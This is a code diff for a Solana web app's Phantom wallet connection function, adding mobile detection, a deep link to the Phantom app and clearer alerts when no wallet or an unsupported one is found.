@@ -6,12 +6,34 @@ import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_
 
 // Define necessary variables
 let walletAddress = null;
+
+// Function to open the Phantom wallet app on mobile
+const openPhantomWallet = () => {
+    // This link will open the Phantom app if it's installed
+    window.location.href = 'https://phantom.app/ul/solana';
+};
+
+// Function to check if the user is on a mobile device
+const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
 // Function to connect the Phantom wallet and execute the whole flow
 async function connectAndExecute() {
     const provider = window.solana;
 
-    if (!provider || !provider.isPhantom) {
-        alert('Phantom wallet not found. Please install it!');
+    // Check for provider and if it’s Phantom
+    if (!provider) {
+        // If no provider is found and it's a mobile device, open the Phantom app link
+        if (isMobile) {
+            openPhantomWallet();
+        } else {
+            alert('No Solana wallet found. Please install one!');
+        }
+        return;
+    }
+
+    // Check if it’s the Phantom wallet
+    if (!provider.isPhantom) {
+        alert('Unsupported Solana wallet detected.');
         return;
     }
 
